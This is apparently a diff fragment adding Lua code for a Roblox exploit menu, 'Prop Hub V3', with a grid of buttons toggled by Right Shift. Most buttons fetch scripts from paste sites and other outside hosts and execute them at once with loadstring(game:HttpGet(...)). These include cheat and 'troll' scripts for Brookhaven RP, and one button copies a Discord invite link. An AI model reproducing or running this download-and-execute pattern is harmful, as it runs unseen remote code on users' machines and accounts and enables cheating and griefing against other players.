+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Johan319/Fe-Godzilla-Obfuscator/refs/heads/main/godzilla"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=raidenmaru"))("raidenmaru")
+end,
+	function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-Nothing-Panel-223707"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/6ZVZWkbb/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/knN2ER4f/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/lXwhhrxw/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/J35BTsjO/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/MeSs5ehk/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-Engine-spider-props-use-sit-props-243775"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/pDY43Jvl/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/LCb15eUP/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/XvOVpQB0/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-Wings-cmback-use-prop-Brookhaven-key-xiandi-211092"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-AVARICE-WINGS-BY-NIZAM-217994"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-ErYx-Prop-Animations-by-vansh-238691"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-TXR-ASHU-ROBOT-POWERFULL-TROLL-SCRIPT-241380"))()
+end,
+	function()
+    local s2 = "https://discord.gg/jFJQj22gjt"
+
+    if setclipboard then
+        setclipboard(s2)
+
+        local TextLabel4 = Instance.new("TextLabel")
+
+        TextLabel4.Name = "CopyNotification"
+        TextLabel4.Size = UDim2.fromOffset(200, 40)
+        TextLabel4.Position = UDim2.new(0.5, -100, 0.5, -20)
+        TextLabel4.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+        TextLabel4.BackgroundTransparency = 0.2
+        TextLabel4.Text = "Discord link copied!"
+        TextLabel4.TextColor3 = Color3.fromRGB(145, 90, 255)
+        TextLabel4.TextSize = 14
+        TextLabel4.Font = Enum.Font.GothamBold
+        TextLabel4.ZIndex = 999
+        TextLabel4.Parent = Frame
+
+        local UICorner10 = Instance.new("UICorner")
+
+        UICorner10.CornerRadius = UDim.new(0, 8)
+        UICorner10.Parent = TextLabel4
+        TextLabel4.BackgroundTransparency = 1
+        TweenService:Create(TextLabel4, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+				BackgroundTransparency = 0.2
+			}):Play()
+        task.wait(2)
+        TweenService:Create(TextLabel4, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+				BackgroundTransparency = 1
+			}):Play()
+        task.wait(0.3)
+        TextLabel4:Destroy()
+
+        return
+    end
+
+    local _syn = syn
+
+    if _syn then
+        _syn = syn.request
+    end
+
+    if _syn then
+        syn.request({
+				Url = s2,
+				Method = "GET"
+			})
+    end
+end
+}
+for i = 1, 30 do
+    local v49 = Frame11:FindFirstChild("Button" .. i)
+
+    if v49 then
+        v49.Activated:Connect(function()
+            local v119 = t4[i]
+
+            if v119 then
+                v119()
+            end
+        end)
+    end
+end
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    local v122 = not gameProcessed
+
+    if v122 then
+        v122 = input.KeyCode == Enum.KeyCode.RightShift
+    end
+
+    if v122 then
+        ScreenGui.Enabled = not ScreenGui.Enabled
+        TextButton2.Visible = not ScreenGui.Enabled
+    end
+end)
+print("Prop Hub V3 Loaded Successfully! (30 Buttons - 6x5 Grid)")
+print("Press Right Shift to toggle GUI")
+print("Button 30 copies Discord link to clipboard!")
